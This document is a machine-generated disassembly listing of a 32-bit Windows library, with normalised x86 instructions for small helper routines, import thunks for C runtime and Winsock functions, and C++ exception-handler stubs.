call sub_100672f0
mov ecx [ esp + 0x14 ]
add esp 0xc
mov edx [ ecx ]
add edx eax
mov eax 0x1
mov [ ecx ] edx
retn
sub_10067a70
mov eax [ esp + 0x8 ]
mov dl [ esp + 0x4 ]
mov ecx [ eax ]
mov [ ecx ] dl
mov ecx [ eax ]
inc ecx
mov [ eax ] ecx
mov eax 0x1
retn
sub_10068160
mov eax rw-data
retn
sub_10068620
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_10069240
mov eax rw-data
retn
sub_10069290
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov [ eax ] rw-data
mov [ eax + 0x4 ] rw-data
mov [ eax + 0x8 ] 0x0
mov eax 0x1
retn
retn
sub_100692c0
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov [ eax ] rw-data
mov [ eax + 0x4 ] rw-data
mov [ eax + 0x8 ] 0x0
mov eax 0x1
retn
retn
sub_10069320
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push eax
call sub_1006a1f0
add esp 0x4
mov eax 0x1
retn
retn
sub_10069f30
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
push eax
push sub_10069f50
mov edx [ ecx + 0x8 ]
push edx
call sub_10020000
add esp 0xc
mov eax 0x1
retn
sub_10069f90
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
and eax 0xff
mov edx [ ecx + 0x4 ]
mov al [ edx + eax * 2 ]
and eax 0x1
retn
sub_10069fb0
movsx eax [ esp + 0x8 ]
sub eax 0x30
retn
sub_1006a240
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
push eax
mov eax [ esp + 0xc ]
push eax
call sub_1001fe60
add esp 0x8
realloc
jmp [ realloc@IAT ]
qsort
jmp [ qsort@IAT ]
wcsstr
jmp [ wcsstr@IAT ]
vfprintf
jmp [ vfprintf@IAT ]
abort
jmp [ abort@IAT ]
strcmp
jmp [ strcmp@IAT ]
tolower
jmp [ tolower@IAT ]
isspace
jmp [ isspace@IAT ]
isdigit
jmp [ isdigit@IAT ]
memchr
jmp [ memchr@IAT ]
getenv
jmp [ getenv@IAT ]
_setmode
jmp [ _setmode@IAT ]
fgets
jmp [ fgets@IAT ]
isxdigit
jmp [ isxdigit@IAT ]
_stat
jmp [ _stat@IAT ]
isupper
jmp [ isupper@IAT ]
sscanf
jmp [ sscanf@IAT ]
gmtime
jmp [ gmtime@IAT ]
strtoul
jmp [ strtoul@IAT ]
fputs
jmp [ fputs@IAT ]
_getch
jmp [ _getch@IAT ]
signal
jmp [ signal@IAT ]
shutdown
jmp [ shutdown@IAT ]
recv
jmp [ recv@IAT ]
WSASetLastError
jmp [ WSASetLastError@IAT ]
send
jmp [ send@IAT ]
sub_1006b090
lea ecx [ ebp - 0x2c ]
jmp sub_10001750
sub_1006b098
mov eax r--data
jmp __CxxFrameHandler
sub_1006b0b0
mov eax r--data
jmp __CxxFrameHandler
sub_1006b0c0
lea ecx [ ebp - 0x30 ]
jmp sub_10001750
sub_1006b0c8
mov eax r--data
jmp __CxxFrameHandler
sub_1006b0e0
lea ecx [ ebp - 0x55c ]
jmp sub_10005790
sub_1006b0eb
mov eax r--data
jmp __CxxFrameHandler
sub_1006b100
lea ecx [ ebp - 0x490 ]
jmp sub_10005790
sub_1006b10b
mov eax r--data
jmp __CxxFrameHandler
sub_1006b120
lea ecx [ ebp - 0x1c ]
jmp sub_10001750
sub_1006b128
mov eax r--data
jmp __CxxFrameHandler
sub_1006b140
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp j_sub_10004af0
sub_1006b14b
mov eax r--data
jmp __CxxFrameHandler
sub_1006b160
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp j_sub_10004af0
sub_1006b16b
mov eax r--data
jmp __CxxFrameHandler
sub_1006b180
mov eax r--data
jmp __CxxFrameHandler
sub_1006b190
mov eax r--data
jmp __CxxFrameHandler
sub_1006b1a0
lea ecx [ ebp - 0x1c ]
jmp j_sub_10004af0
sub_1006b1a8
mov eax r--data
jmp __CxxFrameHandler
sub_1006b1c0
mov eax r--data
jmp __CxxFrameHandler
sub_1006b1d0
lea ecx [ ebp - 0x58 ]
jmp sub_10006470
sub_1006b1d8
mov eax r--data
jmp __CxxFrameHandler
sub_1006b1f0
lea ecx [ ebp - 0x1c ]
jmp sub_10006f00
sub_1006b1f8
mov eax r--data
jmp __CxxFrameHandler
sub_1006b210
mov eax r--data
jmp __CxxFrameHandler
sub_1006b220
lea ecx [ ebp - 0xd8 ]
jmp sub_10001750
sub_1006b22b
mov eax r--data
jmp __CxxFrameHandler
sub_1006b240
lea ecx [ ebp - 0x1c ]
jmp sub_10001750
sub_1006b248
mov eax r--data
jmp __CxxFrameHandler
